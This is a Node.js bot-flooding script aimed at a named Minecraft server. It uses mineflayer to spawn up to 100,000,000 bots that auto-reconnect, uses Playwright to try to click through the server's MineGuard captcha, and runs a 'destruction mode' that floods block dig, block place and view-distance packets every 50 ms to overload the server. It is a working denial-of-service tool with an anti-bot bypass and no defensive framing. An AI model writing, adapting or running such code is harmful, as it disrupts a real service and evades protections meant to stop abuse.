const mineflayer = require('mineflayer');
const playwright = require('playwright-chromium');

const SETTINGS = {
    host: "mc.risemine.space",
    port: 25565,
    version: "1.16.5",
    pass: "johnsinna1941_1488",
    botCount: 100000000,
    joinDelay: 100
};

async function passCaptcha(url) {
    let browser;
    try {
        browser = await playwright.chromium.launch({ headless: true });
        const page = await browser.newPage();
        console.log(`[MineGuard] Пробую пробить: ${url}`);
        await page.goto(url, { waitUntil: 'networkidle' });
        // Пытаемся кликнуть по чекбоксу, если он есть
        const checkbox = await page.$('.recaptcha-checkbox-border');
        if (checkbox) await checkbox.click();
        await page.waitForTimeout(5000); 
        await browser.close();
    } catch (e) {
        if (browser) await browser.close();
        console.log("[Error] Ошибка браузера или капчи.");
    }
}

function createBot(id) {
    const username = `Niko_${Math.random().toString(36).substring(7)}`;
    const bot = mineflayer.createBot({
        host: SETTINGS.host,
        port: SETTINGS.port,
        username: username,
        version: SETTINGS.version
    });

    bot.on('message', (jsonMsg) => {
        const msg = jsonMsg.toString();
        if (msg.includes('mineguard.pro/captcha/')) {
            const url = msg.match(/https:\/\/mineguard\.pro\/captcha\/[a-zA-Z0-9]+/)[0];
            passCaptcha(url);
        }
    });

    bot.on('spawn', () => {
        setTimeout(() => bot.chat(`${SETTINGS.pass} ${SETTINGS.pass}`), 2000);
        
        // Режим уничтожения (Блоки + Пакеты + Чанки)
        setInterval(() => {
            if (bot.entity) {
                const pos = bot.entity.position.floored();
                // Спам пакетами блоков
                bot._client.write('block_dig', { status: 0, location: pos.offset(0, -1, 0), face: 1 });
                bot._client.write('block_place', { hand: 0, location: pos.offset(0, -1, 0), direction: 1, cursorX: 0.5, cursorY: 0.5, cursorZ: 0.5, insideBlock: false });
                // Спам перемещением (Чанки)
                bot._client.write('settings', { locale: 'en_US', viewDistance: Math.random() > 0.5 ? 32 : 1, chatFlags: 0, chatColors: true, skinParts: 127, mainHand: 0 });
            }
        }, 50);
    });

    bot.on('error', () => {});
    bot.on('end', () => setTimeout(() => createBot(id), 1000));
}

for (let i = 0; i < SETTINGS.botCount; i++) {
    setTimeout(() => createBot(i), i * 1000);
}
